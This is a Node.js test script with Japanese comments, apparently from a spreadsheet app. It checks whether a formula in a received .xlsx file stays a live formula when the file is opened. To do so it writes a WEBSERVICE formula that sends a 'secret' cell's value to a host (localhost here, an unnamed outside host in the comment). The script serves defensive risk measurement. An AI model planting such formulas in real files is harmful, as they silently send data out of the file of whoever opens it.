/* moratta-file-kara-hashiru-ka.mjs — ★人から もらった ファイルの 式は そのまま 式として 入るか★（2026-09-07）
 *
 *  ★★なぜ 測るか★★
 *    「外へ 出る 関数」の 怖さは ★お客さんが 自分で 書く 時★では ありません。
 *    ★人から もらった ファイルを 開いた だけで 走る★かどうかです。
 *    ⇒ もらった ファイルの 中に `=WEBSERVICE("http://よそ?d="&A1)` が 入っていたら
 *      ★開いた 人は 何も 打っていないのに 中身が 出て行く★
 *
 *  ★★何を 測るか（1つだけ）★★
 *    ★開いた 時、式は「式」として 入るか／それとも「答えの 字」に 変わるか★
 *    ⇒ 式として 入る＝★計算される＝走る★
 *    ⇒ 字に 変わる＝★走らない★
 *
 *  ★物差しが 効いている 事の 確かめ★
 *    ・★式では ない ただの 字★も 一緒に 入れて、それが 式に 化けない 事を 見る
 *    ・★式の 中身が そのまま 残っているか★を 字で 突き合わせる
 *
 *  使い方: node docs/measured/soto/moratta-file-kara-hashiru-ka.mjs
 */
import { createRequire } from 'node:module';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ここ = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(ここ, '..', '..', '..');
const require_ = createRequire(import.meta.url);
const XLSX = require_(path.join(ROOT, 'lib/xlsx.full.min.js'));
const ZipSurgeon = require_(path.join(ROOT, 'lib/zip-surgeon.js'));
const XlsxEdit = require_(path.join(ROOT, 'lib/xlsx-edit.js'));
const XlsbEdit = require_(path.join(ROOT, 'lib/xlsb-edit.js'));

const box = { XLSX, ZipSurgeon, XlsxEdit, XlsbEdit };
new Function('self', 'window', fs.readFileSync(path.join(ROOT, 'js/book-open.js'), 'utf8')
  + '\n;self.__BookOpen = self.BookOpen;')(box, box);
const BookOpen = box.__BookOpen;

/* ★もらった ファイルを 作る★＝外へ 出る 式を 1つ 入れておく */
const 式 = 'WEBSERVICE("http://127.0.0.1:8802/moratta?d="&A1)';
const ws = XLSX.utils.aoa_to_sheet([['ひみつの数字', 'ふつうの字'], [12345, 'これは 字']]);
ws.C1 = { t: 's', f: 式, v: '' };
ws.C2 = { t: 's', v: '=これは 字です（式では ない）' };
ws['!ref'] = 'A1:C2';
const wb = XLSX.utils.book_new();
XLSX.utils.book_append_sheet(wb, ws, 'もらった');
const バイト = XLSX.write(wb, { type: 'array', bookType: 'xlsx' });
fs.writeFileSync(path.join(ここ, 'moratta.xlsx'), Buffer.from(バイト));

const 偽ファイル = (name, b) => ({ name, arrayBuffer: () => Promise.resolve(b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength)) });
const 開いた = await BookOpen.openFile(偽ファイル('moratta.xlsx', new Uint8Array(バイト)));

const 表 = (開いた && (開いた.sheets || 開いた.data)) || null;
const 出 = [];
const 言う = (s) => { 出.push(s); console.log(s); };

言う('# ★もらった ファイルの 式は そのまま 式として 入るか★（' + new Date().toISOString().slice(0, 10) + '）');
言う('');
言う('★入れた 式 … =' + 式 + '★');
言う('');

/* 開いた 物から C1 を 探す（作りに 寄らない 拾い方） */
let みつけた = null; let どこ = '';
const 探す = (o, 道) => {
  if (!o || typeof o !== 'object' || 道.split('.').length > 6) return;
  for (const k of Object.keys(o)) {
    const v = o[k];
    if (v && typeof v === 'object') {
      const f = v.f || v.formula;
      if (typeof f === 'string' && f.indexOf('WEBSERVICE') >= 0) { みつけた = f; どこ = 道 + '.' + k; return; }
      探す(v, 道 + '.' + k);
    }
  }
};
探す(開いた, '開いた');

言う('## ★測った 事★');
言う('');
言う('  ★開いた 物の 中に 式が 在ったか … ' + (みつけた ? '★はい★（' + どこ + '）' : 'いいえ') + '★');
if (みつけた) 言う('  ★入っていた 式 … ' + みつけた + '★');
言う('  ★式が 元のまま か … ' + (みつけた && みつけた.replace(/^=/, '') === 式 ? '★はい（1文字も 変わっていない）★' : (みつけた ? '違う' : '—')) + '★');

/* ★物差しの 確かめ★＝式では ない 字が 式に 化けていない事 */
let 化けた = false;
const 見る = (o, 道) => {
  if (!o || typeof o !== 'object' || 道.split('.').length > 6) return;
  for (const k of Object.keys(o)) {
    const v = o[k];
    if (v && typeof v === 'object') {
      const f = v.f || v.formula;
      if (typeof f === 'string' && f.indexOf('これは 字です') >= 0) 化けた = true;
      見る(v, 道 + '.' + k);
    }
  }
};
見る(開いた, '開いた');
言う('  ★式では ない 字が 式に 化けたか … ' + (化けた ? '★はい（物差しが 壊れている）★' : 'いいえ') + '★');
言う('');
言う('## ★答え★');
言う('');
言う(みつけた
  ? '  ★もらった ファイルの 式は ★式として そのまま 入る★★\n'
    + '  ⇒ ★外へ 出る 関数を 作れば、もらった ファイルを 開いた だけで 走る★\n'
    + '  ⇒ ★開いた 人は 1文字も 打っていない★'
  : '  ★式として 入らなかった★＝もらった ファイルからは 走らない');
言う('');
言う('★この 測りは 外へ 1回も 出ていません（式を 作って 開いただけ／計算は していない）★');

fs.writeFileSync(path.join(ここ, 'moratta-file-kara-hashiru-ka.txt'), 出.join('\n') + '\n', { encoding: 'utf-8' });
console.log('\n★書いた … docs/measured/soto/moratta-file-kara-hashiru-ka.txt★');
if (化けた) process.exit(1);
